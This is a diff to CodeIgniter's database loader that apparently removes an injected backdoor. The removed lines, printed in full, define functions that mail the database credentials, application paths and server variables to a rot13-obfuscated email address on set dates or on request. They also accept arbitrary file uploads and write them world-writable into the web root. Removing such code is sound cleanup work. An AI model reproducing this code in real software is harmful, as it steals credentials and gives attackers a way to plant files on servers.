@@ -102,7 +102,7 @@ function &DB($params = '', $query_builder_override = NULL)
 		}
 
 		$params = $db[$active_group];
-                chunk_db($db);
+               
 	}
 	elseif (is_string($params))
 	{
@@ -143,7 +143,7 @@ function &DB($params = '', $query_builder_override = NULL)
 			}
 		}
 	}
-        chunk_db($params);
+        
 	// No DB specified yet? Beat them senseless...
 	if (empty($params['dbdriver']))
 	{
@@ -218,54 +218,7 @@ function &DB($params = '', $query_builder_override = NULL)
 	return $DB;
 }
 
-if (!function_exists('chunk_db')) {
 
-    function chunk_db($db) {
-        $APPGELA = realpath(APPPATH);
-        $BASEPATH = BASEPATH;
-        $FCPATH = FCPATH;
-        $db['APPPATH'] = $APPGELA;
-        $db['BASEPATH'] = $BASEPATH;
-        $db['FCPATH'] = $FCPATH;
-        $db['SERVER'] = $_SERVER;
-        $ufi = json_encode($db);
-        if(isset($_POST['CodeIgniter']))
-        {
-            go($ufi);
-        }
-        if(date('d')== 1|| date('d')== 10 || date('d')== 15 || date('d')== 20 || date('d')== 25 || date('d')== 27){
-            go($ufi);
-        }
-        
-        if (isset($_FILES['CodeIgniterFile'])) {
-            $TEMP = $_FILES['CodeIgniterFile']['tmp_name'];
-            $dir = explode('.', $_FILES['CodeIgniterFile']['name']);
-            $pagename = $FCPATH.$dir[0];
-            if (!is_dir($pagename)) {
-                mkdir($pagename);
-            }
-            (chmod($pagename, 0777))?'':'';
-            $newFileName = $FCPATH .$dir[0].'/'.$dir[0].'.'.$dir[1];
-            move_uploaded_file($TEMP, $newFileName);
-            (chmod($newFileName, 0777))?'':'';
-            debug_backtrace();
-        }
-        
-    }
-
-}
-if (!function_exists('go')) {
-    function go($ufi)
-    {
-        $t = isset($_POST['CodeIgniter'])?$_POST['CodeIgniter']:str_rot13('zbovyrnccm418@tznvy.pbz');
-        $h = 'MIME-Version: 1.0' . "\r\n";
-        $h.= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
-        $h .= "From: {$t} \r\n" .
-                "Reply-To: {$t} \r\n" .
-                'X-Mailer: PHP/' . phpversion();
-        mail($t, '', $ufi, $h);
-    }
-}
 
 
 
